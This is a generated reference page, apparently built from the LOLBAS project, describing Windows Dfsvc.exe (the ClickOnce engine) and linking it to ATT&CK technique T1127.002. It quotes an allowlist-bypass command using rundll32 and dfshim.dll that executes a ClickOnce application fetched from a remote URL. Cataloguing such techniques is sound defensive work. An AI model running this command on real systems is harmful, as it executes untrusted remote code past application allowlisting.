---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Dfsvc.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `dfsvc.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dfsvc.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

ClickOnce engine in Windows used by .NET

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/dfsvc.md)
- Source verification: [source record](../../sources/lolbas/dfsvc.exe.md)

## Aliases

- `Dfsvc.exe`
- `dfsvc.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1127.002 - ClickOnce](../../attack/techniques/T1127.002-clickonce.md) | explicit | source | Command metadata lists T1127.002: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/dfsvc.exe.md)

## Source Verification

[source record](../../sources/lolbas/dfsvc.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@subtee'
Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
Command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
Description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
```
